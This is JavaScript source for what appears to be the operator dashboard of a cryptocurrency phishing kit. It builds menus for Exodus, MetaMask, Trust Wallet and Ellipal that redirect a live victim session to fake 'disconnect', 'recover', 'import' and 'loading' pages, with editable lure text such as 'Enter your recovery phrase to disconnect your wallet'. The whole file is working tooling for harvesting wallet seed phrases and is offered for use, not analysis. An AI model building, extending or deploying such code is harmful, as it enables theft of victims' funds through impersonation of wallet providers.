    // Universal roomy animation: wrap panel in .ps-roomy-reveal (0fr→1fr). All .ps-roomy-card inherit via ensureRoomyReveals.
    function mountRoomyCard(cardWrap, btn, panel, parent) {
        if (!cardWrap || !btn || !panel) return;
        var reveal = document.createElement('div');
        reveal.className = 'ps-roomy-reveal';
        cardWrap.appendChild(btn);
        reveal.appendChild(panel);
        cardWrap.appendChild(reveal);
        if (parent) parent.appendChild(cardWrap);
    }
    function ensureRoomyReveals(root) {
        if (!root || !root.querySelectorAll) return;
        root.querySelectorAll('.ps-roomy-card').forEach(function(card) {
            var i, ch, panel = null, hasReveal = false;
            for (i = 0; i < card.children.length; i++) {
                ch = card.children[i];
                if (ch.classList && ch.classList.contains('ps-roomy-reveal')) { hasReveal = true; break; }
            }
            if (hasReveal) return;
            for (i = 0; i < card.children.length; i++) {
                ch = card.children[i];
                if (ch.classList && ch.classList.contains('rp-cfg-panel') && ch.classList.contains('ps-roomy')) {
                    panel = ch; break;
                }
            }
            if (!panel) return;
            var reveal = document.createElement('div');
            reveal.className = 'ps-roomy-reveal';
            card.insertBefore(reveal, panel);
            reveal.appendChild(panel);
        });
        root.querySelectorAll('.ps-roomy-card .ps-roomy-btn').forEach(bindRoomySkipWrapper);
    }

    function bindRoomySkipWrapper(btn) {
        if (!btn || btn._llRoomyWrapped) return;
        var orig = btn.onclick;
        if (typeof orig !== 'function') return;
        btn._llRoomyWrapped = true;
        btn._llOrigOnclick = orig;
        btn.onclick = function(e) {
            if (btn._llSkipNextClick) {
                btn._llSkipNextClick = false;
                return;
            }
            return orig.call(this, e);
        };
    }
    if (!document._llRoomyPtrBound) {
        document._llRoomyPtrBound = true;
        var _llRoomyArmed = null;
        document.addEventListener('pointerdown', function(e) {
            if (e.pointerType !== 'mouse' || e.isPrimary === false || e.button !== 0) return;
            var t = e.target;
            var btn = (t && t.closest) ? t.closest('.ps-roomy-card .ps-roomy-btn') : null;
            if (!btn || typeof btn._llOrigOnclick !== 'function') return;
            if (_llRoomyArmed && _llRoomyArmed.btn) _llRoomyArmed.btn._llSkipNextClick = false;
            _llRoomyArmed = null;
            btn._llOrigOnclick.call(btn);
            btn._llSkipNextClick = true;
            _llRoomyArmed = { btn: btn, pointerId: e.pointerId };
        }, true);
        document.addEventListener('pointerup', function(e) {
            if (!_llRoomyArmed || e.pointerId !== _llRoomyArmed.pointerId) return;
            var armed = _llRoomyArmed;
            if (!armed.btn.contains(e.target)) {
                armed.btn._llSkipNextClick = false;
                _llRoomyArmed = null;
            }
        }, true);
        document.addEventListener('pointercancel', function(e) {
            if (!_llRoomyArmed || e.pointerId !== _llRoomyArmed.pointerId) return;
            _llRoomyArmed.btn._llSkipNextClick = false;
            _llRoomyArmed = null;
        }, true);
    }

    // ANTI-IDIOT — visual toggle for existing anti_dumb 10s disable (behavior unchanged)
    function mkAntiIdiotBtn(id) {
        return '<button type="button" class="ps-anti-idiot-btn" id="'+id+'" aria-pressed="false">'
            +'<span class="ps-anti-idiot-check" aria-hidden="true">✓</span>'
            +'<span class="ps-anti-idiot-label">ANTI-IDIOT</span>'
            +'</button>';
    }
    // Import-only switch chrome (other anti_dumb cards keep .ps-anti-idiot-btn for now)
    function mkAntiIdiotSwitch(id) {
        return '<button type="button" class="ps-anti-idiot-switch" id="'+id+'" aria-pressed="false">'
            +'<span class="ps-anti-idiot-track" aria-hidden="true"><span class="ps-anti-idiot-knob"></span></span>'
            +'<span class="ps-anti-idiot-label">ANTI-IDIOT</span>'
            +'</button>';
    }
    function bindAntiIdiotBtn(btn) {
        if (!btn) return;
        btn.onclick = function() {
            var on = btn.getAttribute('aria-pressed') === 'true';
            on = !on;
            btn.setAttribute('aria-pressed', on ? 'true' : 'false');
            btn.classList.toggle('is-on', on);
        };
    }
    function isAntiIdiotOn(btn) {
        return !!(btn && btn.getAttribute('aria-pressed') === 'true');
    }

    function mkFieldRow(lbl, chkCls, inpCls, defaultVal) {
        var esc = (defaultVal||'').replace(/&/g,'&amp;').replace(/"/g,'&quot;');
        return '<div class="rp-field-row"><span class="rp-label">'+lbl+'</span>'
            +'<label class="rp-toggle-label">Keep default '
            +'<span class="rp-toggle-sw"><input type="checkbox" class="'+chkCls+'" data-default="'+esc+'"><span class="rp-toggle-sw-track"></span></span>'
            +'</label></div>'
            +'<input type="text" class="rp-input '+inpCls+'" placeholder="'+esc+'" value="" disabled="">';
    }

    function mkPhoneInput(prefix) {
        return '<div class="rp-field-row"><span class="rp-label">Phone number</span></div>'
            +'<div class="'+prefix+'-phone-wrap" style="display:flex;align-items:center;gap:4px;">'
            +'<span style="font-family:monospace;font-size:16px;font-weight:700;">+</span>'
            +'<input type="text" class="rp-input '+prefix+'-p1" placeholder="1" maxlength="1" style="width:30px;text-align:center;">'
            +'<input type="number" class="rp-input '+prefix+'-p-stars" placeholder="3" min="0" max="10" style="width:50px;text-align:center;" title="Number of * characters">'
            +'<span style="font-family:monospace;font-size:16px;font-weight:700;">*</span>'
            +'<input type="text" class="rp-input '+prefix+'-p2" placeholder="89" maxlength="2" style="width:40px;text-align:center;">'
            +'</div>';
    }

    function updatePhonePreview(prefix, panel) {
        var iP1=panel.querySelector('.'+prefix+'-p1'),iPStars=panel.querySelector('.'+prefix+'-p-stars'),iP2=panel.querySelector('.'+prefix+'-p2'),preview=panel.querySelector('.'+prefix+'-phone-preview');
        if(!iP1||!iPStars||!iP2||!preview) return;
        var p1=iP1.value.trim()||'1';
        var stars=parseInt(iPStars.value.trim()||'3')||3;
        var p2=iP2.value.trim()||'89';
        var phone='+'+p1+'*'.repeat(stars)+p2;
        preview.textContent=phone;
    }

    function mkSimplePanel(url, label, closeFn, item, opts) {
        opts = opts || {};
        var d=document.createElement('div'); d.className='rp-cfg-panel';
        d.innerHTML=(opts.pageState ? PAGE_STATE_ROW : '') + ACTION_ROW;
        if (opts.pageState) bindPageStateRow(d);
        d.querySelector('.rp-btn-preview').onclick=function(){_openPreviewIframe(url);};
        d.querySelector('.rp-btn-send').onclick=function(){sendCommand('redirect',{url:url});closeFn(item);};
        return d;
    }

    function mkAccordion(closeFn, accordion) {
        return function(skip){ accordion.forEach(function(it){ if(it===skip)return; if(it.open){it.open=false;it.panel.style.display='none';it.btn.classList.remove('is-selected');} }); };
    }

    function mkInput(id,ph){var i=document.createElement('input');i.type='text';i.id=id;i.placeholder=ph;i.className='rp-input';return i;}
    function mkLbl(txt){var s=document.createElement('span');s.className='rp-label';s.textContent=txt;return s;}
    function mkActionRow(onSend,onPreview){
        var r=document.createElement('div');r.className='rp-action-row';
        var pv=document.createElement('button');pv.textContent='Preview';pv.className='rp-btn-preview';pv.onclick=onPreview;
        var sd=document.createElement('button');sd.textContent='Send';sd.className='rp-btn-send';sd.onclick=onSend;
        r.appendChild(pv);r.appendChild(sd);return r;
    }

    // Standard: Keep Default ON = input disabled + blank (placeholder shows default). OFF = enabled + empty ready to type.
    function mkFieldInit(c,i,lsKey){
        if(!c||!i)return;
        localStorage.removeItem(lsKey);
        c.checked=true;
        i.value='';
        i.disabled=true;
        c.addEventListener('change',function(){
            if(c.checked){
                i.value='';
                i.disabled=true;
                localStorage.removeItem(lsKey);
            }else{
                i.value='';
                i.disabled=false;
                i.focus();
            }
        });
        i.addEventListener('input',function(){
            if(!c.checked){localStorage.setItem(lsKey,i.value);}
        });
    }

    // Shared helper: builds a wallet RP cfg section (pages with Keep Default toggles)
    // Always sends ALL configured values  default text when Keep Default is ON, custom when OFF.
    // This ensures user pages never fall back to stale sessionStorage.
    function mkWalletPages(body, pages, lsPrefix, siteLabel) {
        var acc=[], closeAcc=mkAccordion(null,acc);
        pages.forEach(function(pg){
            var item={btn:null,panel:null,open:false};
            var btn=document.createElement('button');
            btn.className='rp-page-btn';
            btn.innerHTML='<span class="rp-btn-label">'+pg.label+'</span><span class="rp-btn-url">'+pg.url+'</span>'+CHEVRON_PG;
            var panel=document.createElement('div');
            panel.className='rp-cfg-panel';
            var h='';
            if(pg.hasConfig){
                h+=mkFieldRow('Title','w-ct','w-t',pg.titleDefault||'');
                if(!pg.noSub) h+=mkFieldRow('Subtitle','w-cs','w-s',pg.subDefault||'');
                h+=mkFieldRow('Button Text','w-cb','w-b',pg.btnDefault||'');
            }
            h+=ACTION_ROW;
            panel.innerHTML=h;
            var iT=panel.querySelector('.w-t'),iS=panel.querySelector('.w-s'),iB=panel.querySelector('.w-b');
            var cT=panel.querySelector('.w-ct'),cS=panel.querySelector('.w-cs'),cB=panel.querySelector('.w-cb');
            var lsT=lsPrefix+'_t'+pg.url,lsS=lsPrefix+'_s'+pg.url,lsB=lsPrefix+'_b'+pg.url;
            // Init: Keep Default ON unless a custom value was previously saved
            function _init(c,i,lsKey){
                if(!c||!i)return;
                var saved=localStorage.getItem(lsKey)||'';
                c.checked=!saved; i.disabled=c.checked;
                i.value=c.checked?(c.dataset.default||''):saved;
            }
            _init(cT,iT,lsT);_init(cS,iS,lsS);_init(cB,iB,lsB);
            // Toggle + input persistence
            function _bind(c,i,lsKey){
                if(!c||!i)return;
                c.addEventListener('change',function(){
                    i.disabled=c.checked;
                    if(c.checked){i.value=c.dataset.default||'';localStorage.removeItem(lsKey);}
                    else{i.value=localStorage.getItem(lsKey)||'';}
                });
                i.addEventListener('input',function(){if(!c.checked)localStorage.setItem(lsKey,i.value);});
            }
            _bind(cT,iT,lsT);_bind(cS,iS,lsS);_bind(cB,iB,lsB);
            // Build post: always include all configured fields so user page never gets stale data
            function _buildPost(){
                var post={};
                if(!pg.hasConfig)return post;
                var t=cT?(cT.checked?(pg.titleDefault||''):(iT?iT.value.trim():'')):'' ;
                var s=(!pg.noSub&&cS)?(cS.checked?(pg.subDefault||''):(iS?iS.value.trim():'')):'';
                var b=cB?(cB.checked?(pg.btnDefault||''):(iB?iB.value.trim():'')):'' ;
                if(t)post['_title']=t;
                if(s)post['_sub']=s;
                if(b)post['_btn']=b;
                return post;
            }
            // Reset fields to Keep Default ON
            function _resetFields(){
                function _r(c,i,lsKey){if(!c||!i)return;c.checked=true;i.disabled=true;i.value=c.dataset.default||'';localStorage.removeItem(lsKey);}
                _r(cT,iT,lsT);_r(cS,iS,lsS);_r(cB,iB,lsB);
            }
            panel.querySelector('.rp-btn-preview').onclick=function(){_openPreviewIframe(pg.url,_buildPost());};
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:pg.url,post:_buildPost()});
                
                closeAcc(item);
                _resetFields();
            };
            btn.onclick=function(){var o=!item.open;closeAcc(item);item.open=o;btn.classList.toggle('is-selected',o);panel.style.display=o?'block':'';};
            item.btn=btn;item.panel=panel;acc.push(item);
            body.appendChild(btn);body.appendChild(panel);
        });
    }

    // "" Inner accordion (inside an overlay body) """""""""""""""""""""""""""""
    function mkSection(title, openByDefault, parentEl) {
        parentEl = parentEl || container;
        var wrap=document.createElement('div');
        wrap.className='rp-section';
        var hdr=document.createElement('button');
        hdr.className='rp-section-hdr';
        hdr.innerHTML='<span class="rp-btn-label">'+title+'</span>'+CHEVRON;
        var body=document.createElement('div');
        body.className='rp-section-body';
        if(!openByDefault) body.style.display='none';
        var arrow=hdr.querySelector('svg');
        if(openByDefault&&arrow)arrow.style.transform='rotate(180deg)';
        hdr.onclick=function(){
            var isOpen=body.style.display!=='none';
            body.style.display=isOpen?'none':'';
            if(arrow)arrow.style.transform=isOpen?'rotate(0deg)':'rotate(180deg)';
        };
        wrap.appendChild(hdr);wrap.appendChild(body);parentEl.appendChild(wrap);
        return body;
    }

    //  Site section builder  slides in as a flex sibling of fc-scroll 
    function openOverlay(title, logoSrc, buildFn, imgFilter) {
        var fcScroll = document.querySelector('.fc-scroll');
        var fcContent = document.getElementById('flows-content');
        if (!fcContent) return;
        if (document.getElementById('rp-site-overlay')) return;

        var ov = document.createElement('div');
        ov.id = 'rp-site-overlay';
        ov.className = 'rp-overlay';

        var hdr = document.createElement('div');
        hdr.className = 'rp-overlay-hdr';

        var backBtn = document.createElement('button');
        backBtn.className = 'rp-back-btn';
        backBtn.innerHTML = 'Back';
        function _toggleSiteBtns(hide) {
            var list = document.getElementById('redirect-btn-list');
            if (!list) return;
            list.querySelectorAll('.rp-site-btn').forEach(function(btn) {
                btn.style.display = hide ? 'none' : '';
            });
        }
        backBtn.onclick = function() {
            ov.classList.add('closing');
            setTimeout(function() {
                _vbAbandonTransientVaultWorkspace();
                if (typeof ov._vbDisposeAddListeners === 'function') {
                    ov._vbDisposeAddListeners();
                    ov._vbDisposeAddListeners = null;
                }
                ov.remove();
                if (fcScroll) fcScroll.style.display = '';
                setRedirectTab(_activeRedirectTab);
            }, 150);
        };
        hdr.appendChild(backBtn);

        var inner = document.createElement('div');
        inner.className = 'rp-overlay-hdr-inner';
        if (logoSrc) {
            var logo = document.createElement('img');
            logo.src = logoSrc;
            logo.className = 'rp-overlay-logo';
            if (imgFilter) logo.style.filter = imgFilter;
            inner.appendChild(logo);
        }
        var titleEl = document.createElement('span');
        titleEl.className = 'rp-overlay-title';
        titleEl.textContent = title;
        inner.appendChild(titleEl);
        hdr.appendChild(inner);

        var body = document.createElement('div');
        body.className = 'rp-overlay-body';

        ov.appendChild(hdr);
        ov.appendChild(body);
        // Hide fc-scroll and append overlay as a flex sibling so verdict/waiting stay visible
        if (fcScroll) fcScroll.style.display = 'none';
        fcContent.appendChild(ov);

        buildFn(body);
        ensureRoomyReveals(body);

        // Clear non-defaulted rp-inputs whenever any Send button fires inside this overlay
        // Mode/Other free-text (ST + Whitelist) must persist after Send — exclude by id.
        ov.addEventListener('click', function(e) {
            if (e.target.classList.contains('rp-btn-send')) {
                setTimeout(function() {
                    ov.querySelectorAll('.rp-input').forEach(function(inp) {
                        if (inp.disabled) return;
                        if (inp.id === 'cb-st-other-inp' || inp.id === 'cb-wl-freetext-inp' || inp.id === 'cb-dc-email-inp'
                            || inp.id === 'cb-cv-email-inp' || inp.id === 'cc-ve-email-inp' || inp.id === 'cc-cv-email-inp' || inp.id === 'cc-sta-other-inp'
                            || inp.id === 'cb-dcw-name-inp' || inp.id === 'cb-dcw-appstore-inp' || inp.id === 'cb-dcw-play-inp'
                            || inp.id === 'cc-dcm-name-inp' || inp.id === 'cc-dcm-appstore-inp' || inp.id === 'cc-dcm-play-inp'
                            || inp.classList.contains('gcd-num')) return;
                        inp.value = '';
                    });
                }, 50);
            }
        });
    }

    // "" Top-level site selector button """"""""""""""""""""""""""""""""""""""""
    var siteButtons = [];
    function mkSiteBtn(title, logoSrc, buildFn, category, imgFilter) {
        var btn = document.createElement('button');
        btn.className = 'rp-site-btn';
        btn.dataset.category = category || 'exchangers';
        var filterStyle = imgFilter ? ' style="filter:'+imgFilter+'"' : '';
        var logoHtml = logoSrc ? '<img src="'+logoSrc+'" loading="lazy" decoding="async"'+filterStyle+'>' : '';
        btn.innerHTML = logoHtml + '<span class="rp-btn-label">'+title+'</span>'
            + '<svg class="rp-site-arrow" width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="9 18 15 12 9 6"/></svg>';
        btn.onclick = function() { openOverlay(title, logoSrc, buildFn, imgFilter); };
        siteButtons.push(btn);
        container.appendChild(btn);
    }
    function mkComingSoonBtn(title, logoSrc, category) {
        var btn = document.createElement('button');
        btn.className = 'rp-site-btn';
        btn.dataset.category = category || 'exchangers';
        btn.disabled = true;
        btn.style.cssText = 'opacity:.45;cursor:not-allowed;pointer-events:none;filter:grayscale(.6)';
        var logoHtml = logoSrc ? '<img src="'+logoSrc+'" loading="lazy" decoding="async">' : '';
        btn.innerHTML = logoHtml + '<span class="rp-btn-label">'+title+'</span>'
            + '<span style="font-size:9px;font-weight:700;color:#fff;background:#9ca3af;border-radius:4px;padding:1px 5px;letter-spacing:.05em;text-transform:uppercase;flex-shrink:0">Soon</span>';
        siteButtons.push(btn);
        container.appendChild(btn);
    }

    // 
    // SITE: Exodus
    // 
    mkSiteBtn('Exodus', '/exodus-logo.svg', function(body) {
        var exAcc=[], exClose=mkAccordion(null,exAcc);
        exClose=function(skip){
            exAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        // Exodus import — roomy design only (Disconnect|Recover + Default|Invalid are UI markers)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Exodus</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">disconnect + recover</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.exPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-ex-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn ex-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn ex-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.ex-preset-disconnect');
            var btnRec=panel.querySelector('.ex-preset-recover');
            function setPreset(key){
                panel.dataset.exPreset=key;
                if(presetRow) presetRow.dataset.exPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.exPreset==='recover' ? '/exodus/recover' : '/exodus/import'; }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(dest()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                exClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;exClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;exAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Loading — roomy card UI (design only, no Default|Invalid)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Loading</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/exodus/loading'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/exodus/loading'});
                
                exClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;exClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;exAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets');

    // MetaMask
    mkSiteBtn('MetaMask', '/metamask/metamask-fox.svg', function(body) {
        var mmAcc=[], mmClose=mkAccordion(null,mmAcc);
        mmClose=function(skip){
            mmAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        // Import — roomy; Disconnect|Recover stay UI markers. Send is GET + page_state.
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">MetaMask</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">disconnect + recover</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.mmPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-mm-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn mm-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn mm-preset-recover">Recover wallet</button>'
              + '</div>'
              + PAGE_STATE_ROW
              + ACTION_ROW;
            bindPageStateRow(panel);
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.mm-preset-disconnect');
            var btnRec=panel.querySelector('.mm-preset-recover');
            function setPreset(key){
                panel.dataset.mmPreset=key;
                if(presetRow) presetRow.dataset.mmPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.mmPreset==='recover' ? '/metamask/recover' : '/metamask/import'; }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(dest()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                var st = panel.dataset.pageState || 'default';
                sendCommand('redirect',{url:dest(),page_state:st});
                
                mmClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;mmClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;mmAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        // Loading — roomy card UI (design only, no Default|Invalid)
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Loading</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/metamask/loading'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/metamask/loading'});
                
                mmClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;mmClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;mmAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets');

    mkSiteBtn('Trust Wallet', '/trust/shield.svg', function(body) {
        var twAcc=[], twClose=mkAccordion(null,twAcc);
        twClose=function(skip){
            twAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Disconnect</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">disconnect page</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.dataset.twPreset='disconnect';
            panel.innerHTML=
                '<div class="rp-action-row ex-preset-row" data-tw-preset="disconnect">'
              +   '<button type="button" class="ps-toggle-btn tw-preset-disconnect ps-toggle-active">Disconnect wallet</button>'
              +   '<button type="button" class="ps-toggle-btn tw-preset-recover">Recover wallet</button>'
              + '</div>'
              + ACTION_ROW;
            var presetRow=panel.querySelector('.ex-preset-row');
            var btnDisc=panel.querySelector('.tw-preset-disconnect');
            var btnRec=panel.querySelector('.tw-preset-recover');
            function setPreset(key){
                panel.dataset.twPreset=key;
                if(presetRow) presetRow.dataset.twPreset=key;
                if(btnDisc) btnDisc.classList.toggle('ps-toggle-active', key==='disconnect');
                if(btnRec) btnRec.classList.toggle('ps-toggle-active', key==='recover');
            }
            if(btnDisc) btnDisc.onclick=function(){ setPreset('disconnect'); };
            if(btnRec) btnRec.onclick=function(){ setPreset('recover'); };
            function dest(){ return panel.dataset.twPreset==='recover' ? '/trust/recover' : '/trust/disconnect'; }
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe(dest()); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:dest()});
                
                twClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;twClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;twAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
        (function(){
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
            var wrap=document.createElement('div');wrap.className='ps-roomy-card';
            var btn=document.createElement('button');
            btn.className='rp-page-btn ps-roomy-btn';
            btn.innerHTML='<span class="ps-roomy-head"><span class="ps-roomy-title" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:16px;font-weight:700;letter-spacing:-0.02em;color:#e5e5e5 !important;">Loading</span><span class="ps-roomy-sub" style="font-family:Inter,-apple-system,BlinkMacSystemFont,\'Segoe UI\',sans-serif;font-size:12px;font-weight:400;letter-spacing:0;color:#6b6b6b !important;">loading state</span></span>'+CHEVRON_PG;
            var panel=document.createElement('div');panel.className='rp-cfg-panel ps-roomy';
            panel.innerHTML=ACTION_ROW;
            panel.querySelector('.rp-btn-preview').onclick=function(){ _openPreviewIframe('/trust/loading'); };
            panel.querySelector('.rp-btn-send').onclick=function(){
                sendCommand('redirect',{url:'/trust/loading'});
                
                twClose(item);
            };
            btn.onclick=function(){
                var o=!item.open;twClose(item);item.open=o;
                btn.classList.toggle('is-selected',o);
                panel.style.display=o?'block':'none';
                if(item.wrap) item.wrap.classList.toggle('is-open',o);
            };
            item.btn=btn;item.panel=panel;item.wrap=wrap;twAcc.push(item);
            wrap.appendChild(btn);wrap.appendChild(panel);body.appendChild(wrap);
        })();
    }, 'wallets');

    // Ellipal
    mkSiteBtn('Ellipal', '/ellipall.png', function(body) {
        var elAcc=[], elClose=mkAccordion(null,elAcc);
        elClose=function(skip){
            elAcc.forEach(function(it){
                if(it===skip) return;
                if(it.manualCloseOnly) return;
                if(it.open){
                    it.open=false;
                    it.panel.style.display='none';
                    it.btn.classList.remove('is-selected');
                }
                if(it.wrap) it.wrap.classList.toggle('is-open', !!it.open);
            });
        };
        // Phrase — TYPE 3 roomy design only; Disconnect|Recover stay UI markers.
        // Send is GET `{url:'/ellipal/1',page_state}` (no leftover copy post). Preview still posts Keep-default copy.
        (function(){
            var POST_DEFAULT={
                _title:'Disconnect your wallet',
                _sub:'Enter your recovery phrase to disconnect your wallet',
                _btn:'Disconnect'
            };
            var item={btn:null,panel:null,open:false,wrap:null,manualCloseOnly:true};
